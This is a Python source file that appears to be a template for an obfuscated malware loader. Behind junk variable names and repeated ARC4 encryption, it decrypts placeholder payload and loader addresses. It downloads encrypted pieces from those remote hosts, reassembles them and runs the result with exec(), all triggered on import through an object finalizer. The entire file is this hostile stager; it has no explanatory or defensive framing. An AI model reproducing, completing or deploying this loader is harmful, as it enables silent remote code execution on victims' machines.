import ctypes
from base64 import b64decode
from random import choice, randint, shuffle
from string import ascii_letters
from Crypto.Cipher import ARC4
from binascii import b2a_hex, a2b_hex, Error
from requests import get
def _b64decode(*args):
    try:return b64decode(*args)
    except:return b''
class Any(object):
    def __init__(self, _U):
        self._P = '_0xFFFFFFF';
        for i in range(0x05):setattr(self, self._P + str(i), get('%s.%s' % (_U, i)).text)
    @staticmethod
    def g():
        _s = ascii_letters;s = [choice(_s) for _ in range(randint(17, 37))];[shuffle(s) for _ in range(9)]
        return ''.join(s).encode('ascii')
    @staticmethod
    def r(k, d):return b2a_hex(ARC4.new(k).encrypt(d))
    @staticmethod
    def d(k, d):
        try:return ARC4.new(k).decrypt(a2b_hex(d))
        except Error:return b''
    def __mul__(self, *args, **kwargs):
        _0x0000FFFA = Any;_0x0000FFFB = _0x0000FFFA.g();S = len(_0x0000FFFB) % 0x0A;
        H = getattr(self, self._P + '0');M = getattr(self, self._P + '1');F = getattr(self, self._P + '2');
        R = _0x0000FFFA.r(_0x0000FFFB, _b64decode(H + M + F));
        def __(_): global R; R = _
        _0x0000FFFF = lambda _=None: [_0x0000FFFA.r(_0x0000FFFB, R) for _ in range(randint(0, S) // 2)]
        _0x0000FFFE = lambda _=None: _0x0000FFFA.r(_0x0000FFFB, _b64decode(H + M))
        _0x0000FFF0 = lambda _=None: _0x0000FFFA.r(_0x0000FFFB, _b64decode(F + M))
        _0x0000FFFD = lambda _=None: [__(_0x0000FFFA.r(_0x0000FFFB, R)) for _ in range(S - 0x00)]
        _0x0000FFFF();_0x0000FFFE();_0x0000FFFD();_0x0000FFFE();_0x0000FFF0();_0x0000FFFF();_0x0000FFFE();_0x0000FFF0();_0x0000FFFF();
        D = _0x0000FFFA.d(_0x0000FFFB, R);
        def ___(_): global D; D = _
        _0x0000FFFC = lambda _=None: [___(_0x0000FFFA.r(_0x0000FFFB, D)) for _ in range(S - 0x00)]
        _0x0000FFFF();_0x0000FFFE();_0x0000FFFC();_0x0000FFFE();_0x0000FFF0();_0x0000FFFF();_0x0000FFFE();_0x0000FFF0();
        return D
class _0x0000FFAD:
    def __del__(self):
        _0xAAAAFFFF = b'{DUMP_KEY}';_0xCCCCFFFF = b'{PAYLOAD_ADDR}';_0xDDDDFFFF = b'{LOADER_ADDR}';
        _0xCCCCFFFF = Any.d(_0xAAAAFFFF, _0xCCCCFFFF).decode('utf8');
        _0xDDDDFFFF = Any.d(_0xAAAAFFFF, _0xDDDDFFFF).decode('utf8');
        _0x0000FFF0 = Any(_0xCCCCFFFF) * self;Any.g() and exec(Any(_0xDDDDFFFF) * self)
Any.g() and _0x0000FFAD()

